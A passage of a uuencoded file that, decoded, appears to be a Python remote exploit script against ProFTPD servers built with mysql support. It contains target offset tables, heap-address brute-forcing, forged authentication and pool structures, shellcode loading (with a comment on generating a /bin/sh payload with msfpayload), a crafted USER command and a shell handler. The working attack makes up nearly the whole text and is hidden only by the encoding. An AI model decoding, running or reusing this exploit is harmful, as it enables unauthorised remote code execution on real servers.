+M9BYM86ME7W5S97)?<W1R:6YG*#`L('5C;"P@9F%K95]L96XI"0H*"0D)"69I
+M<G-T7V]F9G-E="`]('1A<F=E=%LG<W1O<"==("L@;&5N*")087-S=V]R9"!R
+M97%U:7)E9"!F;W(@(BD@*R!L96XH<W1R*&9A:V5A=71H*2D*"0D)"6%C8V5P
+M=&%B;&4@(#T@<V5L9BYC:&5C:U]F;W)?8F%D7V-H87)S*'-T<G5C="YP86-K
+M*"(\3"(L(&9I<G-T7V]F9G-E="DI"@D)"0EA8V-E<'1A8FQE("L]('-E;&8N
+M8VAE8VM?9F]R7V)A9%]C:&%R<RAS=')U8W0N<&%C:R@B/$PB+"!F:7)S=%]O
+M9F9S970K,C@I*0H*"0D)"2-P<FEN="`B9FER<W1?;V9F<V5T.B`P>"4P.'@L
+M(&%C8V5P=&%B;&4Z("5R(B`E("AF:7)S=%]O9F9S970L(&%C8V5P=&%B;&4I
+M"@H)"0EF86ME7W-T<FEN9R`]('-T<BAF86ME875T:"D*"0D)9F%K95]S=')I
+M;F<@*ST@<W1R*'!C*2`J(#(*"0D)(W!R:6YT('-T<BAP8RDN96YC;V1E*"=H
+M97@G*0H)"0D*"0D)9F%K95]S=')I;F<@*ST@<V5L9BYS:&5L;&-O9&4*"@D)
+M"6%S<V5R="AF86ME7W-T<FEN9RYF:6YD*'-T<G5C="YP86-K*"(\3"(L(#!X
+M9&5A9&)E968I*2`A/2`M,2D*"0D)87-S97)T*&QE;BAF86ME7W-T<FEN9RD@
+M/3T@;&5N*'-T<BAF86ME875T:"DI*V9A:V5?;&5N*0H*"@D)"71R:6=G97)?
+M<W1R:6YG("`]('-T<BAT<FEG9V5R875T:"D*"0D)=')I9V=E<E]S=')I;F<@
+M*ST@<W1R*'!B*0H)"0ET<FEG9V5R7W-T<FEN9R`K/2!S='(H<&@I"@D*"0D)
+M87-S97)T*&QE;BAT<FEG9V5R7W-T<FEN9RD@/3T@;&5N*'-T<BAT<FEG9V5R
+M875T:"DI*V]V97)W<FET95]L96XI"@D*"0D)='AT(#T@<W1R*'-E;&8N=&EM
+M96ET*&9A:V5?<W1R:6YG+"!T<FEG9V5R7W-T<FEN9RDI"@D)"7)E<W5L='-;
+M='AT72`]("AF86ME875T:"P@=')I9V=E<F%U=&@L(&QE;BAF86ME7W-T<FEN
+M9RDL(&QE;BAT<FEG9V5R7W-T<FEN9RDI"@D)"7)E<&QA>5MT>'1=(#T@*&9A
+M:V5?<W1R:6YG+"!T<FEG9V5R7W-T<FEN9RD*"0D)"0H*"0D)(VEF*'-E;&8N
+M<VAE;&Q?:&%N9&QE<B@I*3H*"0D)(PEP<FEN="`B+2UU<V5R+6-O;'5M;BUL
+M96YG=&@])60L(&9A:V5A=71H+FQE;F=T:#H@)60L('1R:6=G97)A=71H+FQE
+M;F=T:#H@)60B("4@*`H)"0DC"0EC;VQU;6Y?;&5N9W1H+"!F86ME875T:"YL
+M96YG=&@L('1R:6=G97)A=71H+FQE;F=T:`H)"0DC"2D*"0D)(PH)"0DC"7-E
+M;&8N<V%V95]C86-H92AT87)G970L(&9A:V5?<W1R:6YG+"!T<FEG9V5R7W-T
+M<FEN9RD*"0D)(PEB<F5A:PH*"0D)<')I;G0@(B(*"@D):V5Y<R`](')E<W5L
+M=',N:V5Y<R@I"@D):V5Y<RYS;W)T*"D*"0D*"0EF;W(@:V5Y(&EN(&ME>7-;
+M+38Z73H*"0D)9F%K92P@=')I9V=E<BP@9FPL('1L(#T@<F5S=6QT<UMK97E=
+M"@D)"7!R:6YT("(E<R(@)2!K97D*"0D)<')I;G0@(EQT)7,B("4@9F%K90H)
+M"0EP<FEN="`B7'0E<R(@)2!T<FEG9V5R"@D)"7!R:6YT("(M+2(*"@H)"69P
+M(#T@;W!E;B@G=&5S="YT>'0G+"`G=RLG*0H)"69P+G=R:71E*")<;B(N:F]I
+M;BAK97ES*2D*"0EF<"YC;&]S92@I"@D)"@D)9G`@/2!O<&5N*"=T97-T+G!K
+M;"<L("=W*R<I"@D)9G`N=W)I=&4H<&EC:VQE+F1U;7!S*')E<&QA>2DI"@D)
+M9G`N8VQO<V4H*0H*"0EW:&EL92@Q*3H*"0D)<R`](')A=U]I;G!U="@B4&QE
+M87-E(&5N=&5R(&]F9G-E="!T;R!R97!L87D@6VUA>"`E<UT^("(@)2`H;&5N
+M*')E<W5L=',I+3$I("D*"0D)<R`](',N<W1R:7`H*0H)"0EI9BAS(#T](")E
+M>&ET(BDZ(`H)"0D)8G)E86L*"@D)"6ED>"`](&EN="AS*0H*"0D)<V5L9BYR
+M97!L87DH*G)E<&QA>5MK97ES6VED>%U=*0H*"0ES(#T@<F%W7VEN<'5T*")7
+M:&EC:"!O9F9S970@9&\@>6]U('=A;G0@=&\@8G)U=&5F;W)C92!W:71H/B`B
+M*0H)"7,@/2!S+G-T<FEP*"D*"0EI9'@@/2!I;G0H<RD*"0D*"0ER971U<FX@
+M<F5S=6QT<UMK97ES6VED>%U="@H)9&5F(')U;BAS96QF+"!T87)G970I.@H)
+M"7!R:6YT(");*UT@0G)U=&5F;W)C:6YG(&UE;6]R>2!A;&QO8V%T:6]N<R!F
+M;W(@)7,B("4@=&%R9V5T6R=N86UE)UT*"@D)9F]U;F0@/2!&86QS90H*"0ES
+M96QF+G-H96QL8V]D92`](&]P96XH)W-H96QL8V]D92YB:6XG+"`G<B<I+G)E
+M860H*0H)"2,@<G5B>2`O<F]O="]M<V8S+VUS9G!A>6QO860@;&EN=7@O>#@V
+M+V5X96,@0TU$/2]B:6XO<V@@4B`@/B!S:&5L;&-O9&4R+F)I;@H)"7-E;&8N
+M<VAE;&QC;V1E,B`](&]P96XH)W-H96QL8V]D93(N8FEN)RP@)W(G*2YR96%D
+M*"D*"@D)9F]R('5C;"!I;B!S96QF+G5S97)?8V]L=6UN7VQE;F=T:',Z"@D)
+M"69A:V5A=71H+"!T<FEG9V5R875T:"P@9FPL('1L(#T@<V5L9BYF:6YD7W-T
+M<FEN9W,H=&%R9V5T+"!U8VPI"@H)"0EA9&1R97-S97,@/2!R86YG92AT87)G
+M971;)W-T87)T)UTL('1A<F=E=%LG<W1O<"==+"!T87)G971;)W-T97`G72D*
+M"0D)<')I;G0@861D<F5S<V5S"@D)"2-A9&1R97-S97,@/2!F:6QT97(H;&%M
+M8F1A('@Z("AS970H<W1R=6-T+G!A8VLH(CQ,(BP@>"DI("8@<V5L9BYB861C
+M:&%R<RD@/3T@<V5T*"DL(&%D9')E<W-E<RD*"0D)(V%D9')E<W-E<R`](&9I
+M;'1E<BAL86UB9&$@>#H@*'-E="AS=')U8W0N<&%C:R@B/$PB+"!X*S8T*2D@
+M)B!S96QF+F)A9&-H87)S*2`]/2!S970H*2P@861D<F5S<V5S*0H)"0D*"@D)
+M"7!R:6YT(")';W0@)60@=&%R9V5T<R(@)2!L96XH861D<F5S<V5S*0H)"0EF
+M;W(@861D<F5S<R!I;B!A9&1R97-S97,Z"@D)"0EP<FEN="`B5')Y:6YG(#!X
+M)3`X>"(@)2!A9&1R97-S"@H)"0D);6]D(#T@;&5N*")087-S=V]R9"!R97%U
+M:7)E9"!F;W(@(BD*"0D)"69A:V5?<W1R:6YG("`]('-T<BAF86ME875T:"D*
+M"0D)"6UO9"`K/2!L96XH9F%K95]S=')I;F<I"@D)"0EM;V0@)3T@-`H*"0D)
+M"7!C(#T@4&]O;$-L96%N=7`H"@D)"0D)861D<F5S<RMM;V0K."P*"0D)"0EA
+M9&1R97-S*VUO9"LX+`H)"0D)"6%D9')E<W,K;6]D*S@L"@D)"0D)861D<F5S
+M<RMM;V0K*S@X"@D)"0DI"@H)"0D)9F%K95]S=')I;F<@*ST@<W1R*'!C*2`J
+M(#(@"@D)"0EF86ME7W-T<FEN9R`K/2!S96QF+G-H96QL8V]D90H*"0D)"7!B
+M(#T@4&]O;$)L;VLH861D<F5S<RLQ,#`L(&%D9')E<W,@*R`S,#`L(&%D9')E
+M<W,@*R`R,#`L(#!X-#$T,C0S-#0I"@D)"0EP:"`](%!O;VQ(96%D97(H"@D)
+M"0D)861D<F5S<RLP>#(P,"P*"0D)"0EA9&1R97-S*S!X,S`P+`H)"0D)"6%D
+M9')E<W,K;6]D+3(T+"`C(&]U<B!C;&5A;G5P"@D)"0D)861D<F5S<RLP>#0P
+M,"P*"0D)"0EA9&1R97-S*S!X-3`P+`H)"0D)"6%D9')E<W,K,'@V,#`L"@D)
+M"0D)861D<F5S<RLP>#<P,"P*"0D)"0EA9&1R97-S*S!X-S`P+"`C(&)L86@N
+M"@D)"0DI"@H)"0D)=')I9V=E<E]S=')I;F<@(#T@<W1R*'1R:6=G97)A=71H
+M*0H)"0D)=')I9V=E<E]S=')I;F<@*ST@<W1R*'!B*0H)"0D)=')I9V=E<E]S
+M=')I;F<@*ST@<W1R*'!H*0H*"0D)"2-P<FEN="`B;&5N*&8I.B(L(&QE;BAF
+M86ME7W-T<FEN9RD*"0D)"2-P<FEN="`B9FPZ(BP@9FP*"0D)"2-P<FEN="`B
+M;&5N*'0I.B(L(&QE;BAT<FEG9V5R7W-T<FEN9RD*"0D)"2-P<FEN="`B=&PZ
+M(BP@=&P*"0D)"6%S<V5R="AL96XH9F%K95]S=')I;F<I(#T](&9L*0H)"0D)
+M87-S97)T*&QE;BAT<FEG9V5R7W-T<FEN9RD@/3T@=&PI"@H)"0D)<V5L9BYC
+M;VYN96-T*"D*"0D)"7-E;&8N9&]?9F%K95]A=71H*&9A:V5?<W1R:6YG*0H*
+M"0D)"2-X(#T@<F%W7VEN<'5T*")H:70@96YT97(@=&\@=')I9V=E<B!V=6QN
+M/B`B*0H*"0D)"7-E;&8N<VMT+G-E;F0H(E5315(@)7-<<EQN(B`E('1R:6=G
+M97)?<W1R:6YG*0H*"0D)"7)L:7-T+"!W;&ES="P@>&QI<W0@/2!S96QE8W0N
+M<V5L96-T*%MS96QF+G-K=%TL(%M=+"!;<V5L9BYS:W1=+"`U+C`I"@D)"0EI
+M9BAR;&ES="`]/2!;72!A;F0@>&QI<W0@/3T@6UTI.@H)"0D)"7!R:6YT(")&
+M;W5N9"!`(#!X)3`X>"(@)2!A9&1R97-S"@D)"0D)(R!"3$%(+B!N965D('1O
+M(&%V;VED('1H:7,@9'5E('1O('-S;`H)"0D)"7-E;&8N<VMT+G-E;F0H<V5L
+M9BYS:&5L;&-O9&4R*0H)"0D)"7-E;&8N<VAE;&Q?:&%N9&QE<B@I"@D)"0D)
+M<WES+F5X:70H,2D*"F]F9G-E=%]T87)G971S(#T@6PH)>R`*"0DG;F%M92<Z
+M("=&961O<F$@,3`@4')O1E101"!P<F]F='!D+6UY<W%L+3$N,RXQ+38G+`H)
+M"2=T>7!E)SH@)V]F9G-E="<L"@D))W)E<W!?8G5F)SH@,'@X,&5D.#@P+`H)
+M"2=O9F9S970G.B`P>#@P-C-E93,L"@D))V5X96-V)SH@,'@P.#`U,C9B."P*
+M"7TL"@E[(`H)"2=N86UE)SH@)T9E9&]R82`Y(%!R;T944$0@<')O9G1P9"UM
+M>7-Q;"TQ+C,N,2TS)RP*"0DG='EP92<Z("=O9F9S970G+`H)"2=R97-P7V)U
+M9B<Z(#!X,#@P96)C-C`L"@D))V]F9G-E="<Z(#!X,#@P-C,Y.&4L"@D))V5X
+M96-V)SH@,'@P.#`U,C8V."P*"7TL"ET*"F)R=71E9F]R8V5?=&%R9V5T<R`]
+M(%L*"7L*"0DC(#`X,&4T,#`P+3`X,&5C,#`P"@D))VYA;64G.B`G4')O1E10
+M1"!&0R`Q,"<L"@D))W-T87)T)SH@,'@X,&5D.#@P*S$R."P*"0DG<W1O<"<Z
+M(#!X.#!E9#@P-"P*"0DG<W1E<"<Z("TR."P*"7TL"@E["@D)(R`P.#!F,3(R
+M,"!L("`@("!/("YB<W,@("`P,#`P,30P,"`@("`@("`@("`@("`@<F5S<%]B
+M=68*"0DG;F%M92<Z("=D96)I86X@=&5S="<L"@D))W-T87)T)SH@,'@P.#!F
+M,3(R,"LR,#`L"@D))W-T;W`G.B`P>#`X,&8Q,C(P*S@P+`H)"2=S=&5P)SH@
+M+3(X+`H)?0I="@ID968@9'5M<%]T87)G971S*"DZ"@EC;W5N=&5R(#T@,0H)
+M<')I;G0@(D]F9G-E="!B87-E9"!T87)G971S(&%V86EL86)L93HB"@EF;W(@
+M=&%R9V5T(&EN(&]F9G-E=%]T87)G971S.@H)"7!R:6YT(")<=%1A<F=E="!;
+M)61=("T@)7,B("4@*&-O=6YT97(L('1A<F=E=%LG;F%M92==*0H)"6-O=6YT
+M97(@*ST@,0H)"@EC;W5N=&5R(#T@,0H)<')I;G0@(B(*"7!R:6YT(")"<G5T
+M969O<F-E('1A<F=E=',@879A:6QA8FQE.B(*"69O<B!T87)G970@:6X@8G)U
+M=&5F;W)C95]T87)G971S.@H)"7!R:6YT(")<=%1A<F=E="!;)61=("T@)7,B
+M("4@*&-O=6YT97(L('1A<F=E=%LG;F%M92==*0H*"7D@/2`P+S`*"@ES>7,N
+M97AI="@Q*0H*9&5F('!A<G-E7V%R9W,H87)G<RDZ"@EP87)S97(@/2!/<'1I
+M;VY087)S97(H=7-A9V4](G5S86=E.B`E<')O9R!;;W!T:6]N<UT@:&]S=%]T
+M;U]E>'!L;VET(BD*"7!A<G-E<BYA9&1?;W!T:6]N*"(M="(L("(M+71A<F=E
+M="(L(&%C=&EO;CTB<W1O<F4B+"!T>7!E/2)I;G0B+"!H96QP/2)$:7-T<FEB
+M=71I;VX@=&\@=&%R9V5T(BP@9&5F875L=#TP+"!D97-T/2)T87)G970B*0H)
+M<&%R<V5R+F%D9%]O<'1I;VXH(BUP(BP@(BTM<&]R="(L(&%C=&EO;CTB<W1O
+M<F4B+"!H96QP/2)#;VYN96-T(&]N('!O<G0B+"!D969A=6QT/3(Q*0H)<&%R
+M<V5R+F%D9%]O<'1I;VXH(BUS(BP@(BTM<W-L(BP@86-T:6]N/2)S=&]R95]T
+M<G5E(BP@:&5L<#TB16YA8FQE(%-33"!F;W(@97AP;&]I=&%T:6]N("AV:6$@
+M4D9#-#(Q-RDB+"!D969A=6QT/49A;'-E*0H)<&%R<V5R+F%D9%]O<'1I;VXH
+M(BUM(BP@(BTM;6]D92(L(&%C=&EO;CTB<W1O<F4B+"!T>7!E/2)C:&]I8V4B
+M+"!C:&]I8V5S/5LB8G)U=&5F;W)C92(L(")O9F9S971S(ETL(&1E9F%U;'0]
+M(F]F9G-E=',B*0H)<&%R<V5R+F%D9%]O<'1I;VXH(BUL(BP@(BTM;&ES="UT
+M87)G971S(BP@86-T:6]N/2)S=&]R95]T<G5E(BP@9&5F875L=#U&86QS92D*
+M"@EG<F]U<"`]($]P=&EO;D=R;W5P*'!A<G-E<BP@(D1E8G5G9VEN9R!O<'1I
+M;VYS(BP@(E1H97-E(&]P=&EO;G,@87)E(&UO<W1L>2!U<V5F=6P@9F]R(&1E
+M8G5G9VEN9R!T:&4@97AP;&]I="!C;V1E+"!O<B!I9B!Y;W4@:VYO=R!H;W<@
+M=&AE(')E;6]T92!M86-H:6YE(&ES(&-O;F9I9W5R960N(BD*"6=R;W5P+F%D
+M9%]O<'1I;VXH(BTM=7-E<BUC;VQU;6XM;&5N9W1H(BP@86-T:6]N/2)S=&]R
+M92(L(&1E9F%U;'0],"P@:&5L<#TB4U%,(%5S97)N86UE(&-O;'5M;B!L96YG
+M=&@N(BP@='EP93TB:6YT(BP@9&5S=#TB=7-E<E]C;VQU;6Y?;&5N9W1H(BD*
+M"6=R;W5P+F%D9%]O<'1I;VXH(BTM<VQE97`M869T97(M8V]N;F5C="(L(&%C
+M=&EO;CTB<W1O<F5?=')U92(L(&AE;'`](E-L965P(&$@8V]U<&QE(&]F('-E
+M8V]N9',@<V\@82!D96)U9V=E<B!C86X@8F4@8V]N;F5C=&5D(BP@9&5F875L
+M=#U&86QS92P@9&5S=#TB<VQE97!?869T97)?8V]N;F5C="(I"@EG<F]U<"YA
+M9&1?;W!T:6]N*"(M+6EG;F]R92UC86-H92(L(&%C=&EO;CTB<W1O<F5?=')U
+M92(L(&AE;'`](DEG;F]R92!T:&4@8V%C:&4@;V8@<W5C8V5S<V9U;"!P<F5V
+M:6]U<R!A='1E;7!T<R(L(&1E9F%U;'0]1F%L<V4L(&1E<W0](FEG;F]R95]C
+M86-H92(I"@EG<F]U<"YA9&1?;W!T:6]N*"(M+7-E960B+"!A8W1I;VX](G-T
+M;W)E(BP@='EP93TB:6YT(BP@:&5L<#TB4V5E9"!T:&4@<F%N9&]M(&YU;6)E
+M<B!W:71H('-U<'!L:65D('9A;'5E(BP@9&5F875L=#TP+"!D97-T/2)S965D
+M(BD*"@EP87)S97(N861D7V]P=&EO;E]G<F]U<"AG<F]U<"D*"0H);W!T<RP@
+M87)G<R`]('!A<G-E<BYP87)S95]A<F=S*&%R9W,I"@H):68H;&5N*&%R9W,I
+M(#T](#`I.@H)"7!R:6YT(")0;&5A<V4@<W!E8VEF>2!T:&4@:&]S="!T;R!E
+M>'!L;VET(@H)"7-Y<RYE>&ET*#$I"@H):68H;W!T<RYT87)G970@/3T@,"DZ
+M"@D)<')I;G0@(E!L96%S92!S<&5C:69Y(&$@=&%R9V5T('1O(&%T=&%C:RXN
+M(@H)"61U;7!?=&%R9V5T<R@I"@H):68H;W!T<RYL:7-T7W1A<F=E=',I.@H)
+M"61U;7!?=&%R9V5T<R@I"@H):68H;W!T<RYS<VP@86YD(&YO="!S<VQ?879A
+M:6QA8FQE*3H*"0EP<FEN="`B+2US<VP@=7-E9"P@8G5T('1H:7,@=F5R<VEO
+M;B!O9B!P>71H;VX@9&]E<R!N;W0@:&%V92`G:6UP;W)T('-S;"<@;W!T:6]N
+M(@H)"7!R:6YT(")&;W(@=F5R<VEO;G,@;V8@<'ET:&]N(#P@,BXV+"!Y;W4@
+M8V%N('5S92!H='1P.B\O<'EP:2YP>71H;VXN;W)G+W!Y<&DO<W-L(@H)"7!R
+M:6YT(")T;R!G970@=&AA="!S=7!P;W)T(@H)"7-Y<RYE>&ET*#$I"@H):68H
+M;W!T<RYS965D*3H*"0ER86YD;VTN<V5E9"AO<'1S+G-E960I"@D)<')I;G0@
+M(ELK72!3965D960@=VET:"`E9"(@)2!O<'1S+G-E960*"@ER971U<FX@;W!T
+M<RP@87)G<PH*9&5F(&UA:6XH87)G=6UE;G1S*3H*"@EI9B@B+2UT97-T(B!I
+M;B!A<F=U;65N=',I.@H)"6EM<&]R="!D;V-T97-T"@D)9&]C=&5S="YT97-T
+M;6]D*"D*"0ER971U<FX*"@EO<'1S+"!A<F=S(#T@<&%R<V5?87)G<RAA<F=U
+M;65N=',I"@H):68H;W!T<RYM;V1E(#T](")O9F9S971S(BDZ"@D)<&\@/2!0
+M<F]&5%!$7T]F9G-E=',H87)G<ULP72P@;W!T<RD*"0EI9BAO<'1S+G1A<F=E
+M="`\(#$@;W(@;W!T<RYT87)G970@/B!L96XH;V9F<V5T7W1A<F=E=',I*3H*
+M"0D)9'5M<%]T87)G971S*"D*"0H)"7!O+G)U;BAO9F9S971?=&%R9V5T<UMO
+M<'1S+G1A<F=E="TQ72D*"0H)96QI9BAO<'1S+FUO9&4@/3T@(F)R=71E9F]R
+M8V4B*3H*"0EP8B`](%!R;T944$1?0G)U=&5F;W)C92AA<F=S6S!=+"!O<'1S
+M*0H)"6EF*&]P=',N=&%R9V5T(#P@,2!O<B!O<'1S+G1A<F=E="`^(&QE;BAB
+M<G5T969O<F-E7W1A<F=E=',I*3H*"0D)9'5M<%]T87)G971S*"D*"@D)<&(N
+M<G5N*&)R=71E9F]R8V5?=&%R9V5T<UMO<'1S+G1A<F=E="TQ72D*"FEF(%]?
+K;F%M95]?(#T]("=?7VUA:6Y?7R<Z"@EM86EN*'-Y<RYA<F=V6S$Z72D*"@``
+`
+end
